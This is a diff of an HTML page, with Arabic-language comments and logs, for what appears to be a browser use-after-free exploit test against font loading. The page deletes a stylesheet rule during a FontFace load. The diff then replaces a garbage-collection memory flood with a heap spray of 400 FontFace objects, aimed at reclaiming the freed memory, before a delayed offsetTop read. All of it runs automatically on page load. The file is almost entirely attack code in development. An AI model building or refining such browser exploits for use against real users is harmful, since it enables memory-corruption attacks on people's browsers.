@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>تفكيك التوقيت المتقدم - إجبار تدوير الذاكرة</title>
+    <title>تفكيك تدوير الذاكرة - الفحص النوعي</title>
     <style>
         body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
         #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
@@ -17,7 +17,7 @@
 </head>
 <body>
 
-    <h2>مراقبة تدوير الذاكرة التلقائي (Forced Heap Churning)</h2>
+    <h2>مراقبة استبدال الكائنات المعزولة (Font Spray)</h2>
     <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المتصفح...</div>
 
     <script>
@@ -30,18 +30,12 @@
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        // دالة مخصصة لإغراق الذاكرة وإجبار المحرك على التنظيف
-        function gc() {
-            screenLog("جاري تنشيط ميكانيكية إغراق الذاكرة (Forced GC)...");
-            for (let i = 0; i < 200; i++) {
-                // إنشاء مصفوفات ضخمة بشكل متكرر لإجبار المحرك على التخلص من الكائنات المعلقة
-                let s = new ArrayBuffer(0x10000); 
-            }
-        }
+        // مصفوفة لتخزين الخطوط برمجياً لمنع حذفها الفوري
+        var target_spray = [];
 
         function startExploitAnalysis() {
             consoleElement.innerHTML = ""; 
-            screenLog("بدء تشغيل الثغرة تلقائياً...");
+            screenLog("بدء تشغيل الفحص النوعي التلقائي...");
 
             try {
                 let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
@@ -59,13 +53,16 @@
                             
                             try {
                                 document.getElementById('s').sheet.deleteRule(0);
-                                screenLog("تم حذف القاعدة التنسيقية.");
+                                screenLog("تم حذف القاعدة التنسيقية بنجاح.");
                             } catch(e) { screenLog("خطأ أثناء الحذف: " + e.message, true); }
                             
-                            // إطلاق الإغراق فوراً بعد الحذف للتأثير على الكائن المعلق
-                            gc();
+                            // هندسة الإغراق النوعي: حجز خطوط بديلة في الـ Heap المعزول لإجبار التدوير
+                            screenLog("جاري حجز كائنات FontFace بديلة لتغيير عناوين الذاكرة...");
+                            for (let i = 0; i < 400; i++) {
+                                target_spray.push(new FontFace("font_spray", "local(Arial)", {}));
+                            }
 
-                            // قراءة الـ Offset المؤجلة لمعاينة السلوك
+                            // قراءة الـ Offset المؤجلة
                             setTimeout(() => {
                                 screenLog("محاولة القراءة المؤجلة (offsetTop)...");
                                 let offset = document.body.offsetTop;
@@ -81,17 +78,17 @@
                 document.fonts.load('1em x', 'AB');
 
             } catch (err) {
-                screenLog("خطأ عام في النظام: " + err.message, true);
+                screenLog("خطأ عام: " + err.message, true);
             }
         }
 
         window.onload = () => {
-            screenLog("تم تحميل الصفحة. الانتظار 1.5 ثانية للاستقرار المستند الفعلي...");
+            screenLog("تم تحميل الصفحة. الانتظار 1.5 ثانية لتنظيف مخلفات التحديث السابق...");
             setTimeout(startExploitAnalysis, 1500);
         };
 
         window.onerror = function(msg) {
-            screenLog("استثناء غير معالج: " + msg, true);
+            screenLog("استثناء: " + msg, true);
             return true;
         };
     </script>
